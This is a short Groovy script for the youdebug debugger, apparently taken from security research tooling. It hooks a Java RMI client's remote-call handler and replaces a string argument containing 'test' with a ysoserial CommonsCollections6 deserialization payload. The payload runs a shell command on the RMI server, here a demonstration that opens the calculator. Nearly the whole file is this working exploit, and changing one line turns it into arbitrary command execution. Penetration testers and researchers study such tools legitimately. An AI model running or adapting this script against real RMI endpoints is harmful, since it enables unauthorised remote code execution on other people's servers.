// Unfortunately, youdebug does not allow to pass arguments to the script
// you can change the important parameters here
def payloadName = "CommonsCollections6";
def payloadCommand = "open /Applications/Calculator.app";
def needle = "test"

println "Loaded..."

// set a breakpoint at "invokeRemoteMethod", search the passed argument for a String object
// that contains needle. If found, replace the object with the generated payload
vm.methodEntryBreakpoint("java.rmi.server.RemoteObjectInvocationHandler", "invokeRemoteMethod") {
  // make sure that the payload class is loaded by the classloader of the debugee
  vm.loadClass("ysoserial.payloads." + payloadName);

  println "[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called"

  // get the Array of Objects that were passed as Arguments
  //idx恒为0
  delegate."@2".eachWithIndex { arg,idx ->
	  println "[+] Argument " + idx + ": " + arg[1].toString();
    
    if(arg[1].toString().contains(needle)) {
      println "[+] Needle " + needle + " found, replacing String with payload" 
      def payload = vm._new("ysoserial.payloads." + payloadName);
      def payloadObject = payload.getObject(payloadCommand)
      //idx+1 这里对应替换第几个参数 与上面的arg[1]对应
      vm.ref("java.lang.reflect.Array").set(delegate."@2",idx+1, payloadObject);
	    println "[+] Done.."	
	  }
  }
}